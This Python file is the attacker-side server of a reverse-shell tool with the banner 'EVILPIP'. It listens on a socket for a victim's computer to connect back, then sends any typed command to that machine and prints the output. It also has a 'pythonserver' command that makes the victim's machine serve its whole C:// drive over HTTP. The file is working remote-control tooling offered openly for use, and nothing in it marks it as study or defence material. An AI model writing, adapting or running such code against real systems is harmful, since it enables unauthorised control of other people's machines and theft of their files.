import socket, colorama
from os import system
from colorama import Fore as f

""" This is the file that you should run before someone executes the __main__.py script (to accept the connection) """

class VARIABLES:
    """ Connection variables for socket """
    serverip  = "YOUR-IP" # your server/host ip
    port      = 80 # port to connect to
    buffer    = 1024 # buffer to send (in bytes) each packet

class C:
    """ Program colors """
    colorama.init()
    RED = f.RED
    CYAN = f.CYAN
    ENDC = f.RESET

class Server:
    """ Accept socket connections and make reverse shell """
    def __init__(self):
        self.ascii = f"""{C.RED}
▄▄▄ . ▌ ▐·▪  ▄▄▌   ▄▄▄·▪   ▄▄▄·
▀▄.▀·▪█·█▌██ ██•  ▐█ ▄███ ▐█ ▄█
▐▀▀▪▄▐█▐█•▐█·██▪   ██▀·▐█· ██▀·
▐█▄▄▌ ███ ▐█▌▐█▌▐▌▐█▪·•▐█▌▐█▪·•
 ▀▀▀ . ▀  ▀▀▀.▀▀▀ .▀   ▀▀▀.▀   
          {C.ENDC}use 'help'
		"""

    def Banner(self):
        system('cls')
        print(self.ascii)

    def Exit(self, cs, s):
        cs.close()
        s.close()
        print(f"\n{C.ENDC}[{C.CYAN}+{C.ENDC}]", end="")

    def HelpMenu(self):
        print(f"""
        {C.ENDC}[{C.CYAN}*{C.ENDC}] help @~
            {C.RED}->{C.ENDC} help - this message
            {C.RED}->{C.ENDC} clearlog - clears console
            {C.RED}->{C.ENDC} pythonserver - starts http server
            {C.RED}->{C.ENDC} exit - quits reverse shell
        """)

    def Main(self):
        self.Banner()
        s = socket.socket()
        s.bind((VARIABLES.serverip, VARIABLES.port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)

        print(f"Listening as {C.CYAN}{VARIABLES.serverip}{C.ENDC}:{C.CYAN}{VARIABLES.port}{C.ENDC} ...")
        client_socket, client_address = s.accept()
        client_address = f"{C.RED}{client_address[0]}{C.ENDC}:{C.RED}{client_address[1]}{C.ENDC}"

        self.Banner()
        cwd = client_socket.recv(VARIABLES.buffer).decode()
        print(f"Victim PC -> {client_address}")
        print(f"\n[{C.CYAN}+{C.ENDC}] Current working directory: {cwd}\n")

        while True:
            print(f"{C.RED}{cwd} {C.CYAN}$> {C.RED}", end="")
            command = input()

            if command.lower() == "help":
                self.HelpMenu()
                continue
            elif command.lower() == "clearlog":
                self.Banner()
                continue
            elif command.lower() == "pythonserver":
                """ I'm going to make a HTTP tunnel function soon """
                print(C.ENDC)
                client_socket.send("python -m http.server --bind localhost --directory C:// 80".encode())
                print(f"[{C.CYAN}+{C.ENDC}] Python HTTP server started on localhost port {C.RED}80{C.ENDC} !\n")
                continue

            elif command.lower() == "exit":
              self.Exit(client_socket, s)
            if not command.strip():
              continue
            else:
                client_socket.send(command.encode())
                output = client_socket.recv(VARIABLES.buffer).decode()
                print(f"{C.ENDC}[{C.CYAN}+{C.ENDC}] Command Output: \n{output}\n")


if __name__ == '__main__':
    Server = Server()
    Server.Main()
